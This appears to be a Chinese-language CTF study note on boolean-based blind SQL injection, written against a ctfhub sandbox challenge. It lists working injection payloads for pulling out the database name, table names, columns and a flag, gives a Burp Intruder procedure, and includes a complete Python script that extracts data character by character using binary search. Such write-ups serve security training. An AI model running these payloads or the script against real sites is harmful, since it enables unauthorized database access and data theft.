# 05 · 布尔盲注

> 日期：2026-09-18 | 标签：#Web安全 #SQL注入 #盲注

## 1.什么是布尔盲注

盲注是"看不到数据"时用的注入：页面不显示结果、也不显示报错，但会因 SQL 条件的真假而反应不同；我们靠不断问"是/否"问题，把数据一点点推断出来。

## 2. 三种注入的对比

| 类型 | 数据从哪出来 | 前提条件 |
|---|---|---|
| 联合注入 | 查询结果显示区 | 页面有回显位 |
| 报错注入 | 错误信息里 | 页面显示数据库报错 |
| **布尔盲注** | **靠"是/否"反馈推断** | **无回显、无报错** |

## 3. 关键函数

| 函数 | 作用 | 例子 |
|---|---|---|
| `length(x)` | 求长度 | `length(database())` = 4 |
| `substr(x, 位置, 长度)` | 截取字符（位置从 **1** 开始） | `substr(database(),1,1)` = 第 1 个字符 |
| `ascii(x)` | 字符 → ASCII 码（方便比较大小） | `ascii('s')` = 115 |
| `chr(数字)` | ASCII 码 → 字符（Python 里用） | `chr(115)` = `s` |

## 4. 常用 payload（整数型）

> 如果是字符型，前面加 `'`、后面加 `#`。

```
# ① 判断真假（先做这个）
1 and 1=1   页面显示***query_success***
1 and 1=2   页面显示***query_error***

# ② 猜长度
1 and length(database())=4

# ③ 猜字符（直接试）
1 and ascii(substr(database(),1,1))=115

# ④ 猜字符（二分法，更快）
1 and ascii(substr(database(),1,1))>100
1 and ascii(substr(database(),1,1))>110
1 and ascii(substr(database(),1,1))>115

# ⑤ 猜表名（第 1 张表）
1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=115

# ⑥ 猜 flag
1 and ascii(substr((select flag from flag),1,1))=99
```
## 5. 方法一：用 Burp Intruder（不用写代码）

1. **手动确认真假页面差异**：分别访问 `1 and 1=1` 和 `1 and 1=2`，找出真页面独有的关键词（或长度差异）如页面显示**query_success**，**query_error**
2. 在 Burp 浏览器访问完整的 payload 地址（http://challenge-3f50e4ac167c1aea.sandbox.ctfhub.com:10800/？id=1 and ascii(substr(database(),1,1))=32），让 Burp 自动编码空格

3. 回 Burp → Proxy → HTTP history → 找到请求 → 右键 **Send to Intruder**
4. **Positions**：选择`Cluster bomb attack`,点 Clear §，然后选中位置`1`（第一个1）->Add §,第二个选 ASCII 数字（如 `32`）→ Add §
   ```
   id=1 and ascii(substr(database(),§1§,1))=§32§
   ```
5. **Payloads**：加载 32~127 的数字列表（可用 `32..127 | Set-Content D:\ascii.txt` 生成，打开PowrShell输入该命令即可）
6. **Settings**：勾选 **Grep - Match** → Add → 填入真页面的关键词
7. 点 **Start attack**
8. **看结果**：
   - 看 **Length** 列，长度与众不同的那行
   - 或看 **Grep - Match** 列，打 ✅ 的那行
   - 那行的 **Payload 值**就是 ASCII 码
9. 改 `substr` 的位置参数（1→2→3…）重复，或改用 **Cluster bomb** 一次跑完
10. 只给了猜 database() 的例子，没给完整的"库名→表名→字段名→flag"链路。补上 👇

①库名
```
id=1 and ascii(substr(database(),§1§,1))=§32§
```
②表名（一张一张取）
```
第一张表：
id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),§1§,1))=§32§
第 2 张表： 把 limit 0,1 改成 limit 1,1
第 3 张表： 改成 limit 2,1 …… 直到猜不出东西为止
```
③字段名
```
id=1 and ascii(substr((select column_name from information_schema.columns where table_name='flag' limit 0,1),§1§,1))=§32§
```
④取flag
```
id=1 and ascii(substr((select flag from flag limit 0,1),§1§,1))=§32§
```
### 方法二：python脚本(完整的"库名→表名→字段名→flag"链路)
```python
import requests
import time

# ==================== 配置区 ====================
URL = "http://challenge-1cd8a7d83d2ba171.sandbox.ctfhub.com:10800/?id="
PAYLOAD_TEMPLATE = "1 and {condition}"     # 整数型；字符型改成 "1' and {condition} #"
KEYWORD = "query_success"
# =================================================

session = requests.Session()

def is_true(condition):
    payload = PAYLOAD_TEMPLATE.format(condition=condition)
    r = session.get(URL + payload, timeout=10)
    time.sleep(0.05)
    return KEYWORD in r.text


# ==================== 要查的目标 ====================
# 直接取 flag（先试这个）
target = "(select flag from flag limit 0,1)"

# 如果上面跑不出东西，换成下面这些来查表名/字段名：
# target = "database()"
# target = "(select table_name from information_schema.tables where table_schema=database() limit 0,1)"
# target = "(select table_name from information_schema.tables where table_schema=database() limit 1,1)"
# target = "(select column_name from information_schema.columns where table_name='flag' limit 0,1)"
# ===================================================


# ---------- 第 1 步：猜长度 ----------
length = 0
for i in range(1, 100):
    if is_true(f"length({target})={i}"):
        length = i
        print(f"[+] 长度 = {i}")
        break

if length == 0:
    print("[!] 没猜出长度，检查：KEYWORD / payload 类型 / 靶场地址是否还有效")
    exit()


# ---------- 第 2 步：二分法逐字符猜 ----------
result = ""
for pos in range(1, length + 1):
    low, high = 32, 127
    while low < high:
        mid = (low + high) // 2
        if is_true(f"ascii(substr({target},{pos},1))>{mid}"):
            low = mid + 1
        else:
            high = mid
    result += chr(low)
    print(f"[+] 已猜出: {result}")

print(f"\n[✓] 结果 = {result}")
```
## 6. ASCII 速查表（实战常用）

| ASCII | 字符 |
|---|---|
| 48~57 | 数字 0~9 |
| 65~90 | 大写 A~Z |
| 95 | 下划线 `_` |
| 97~122 | 小写 a~z |
| 123 | `{` |
| 125 | `}`（flag 结尾常见） |
## 7. 踩坑记录
- Burp 社区版 Intruder **限速**，96 个请求要等 1~2 分钟，不是卡死
- 靶场地址有时效，环境关闭后重新开题会得到**新地址**
